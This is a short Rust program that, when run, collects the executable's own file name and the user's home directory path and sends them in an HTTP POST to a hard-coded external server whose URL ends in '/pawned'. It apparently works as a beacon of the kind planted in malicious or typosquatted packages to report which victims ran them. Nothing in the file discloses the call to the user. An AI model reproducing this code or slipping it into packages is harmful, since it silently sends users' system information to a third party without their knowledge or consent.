use std::{env};
use dirs;

const SERVER_URL: &str = "http://app-b4391c87-fd8e-4408-806f-5810e7778883.cleverapps.io/pawned";

fn main() {
    let current_exe = env::current_exe().unwrap();
    let current_exe_fname = current_exe.file_name().unwrap().to_str().unwrap();
    let pb_homedir = dirs::home_dir().unwrap();
    let homedir = pb_homedir.to_str().unwrap();
    let client = reqwest::Client::new();
    let _ = client.post(format!("{SERVER_URL}/{current_exe_fname}/{homedir}")).send();
}
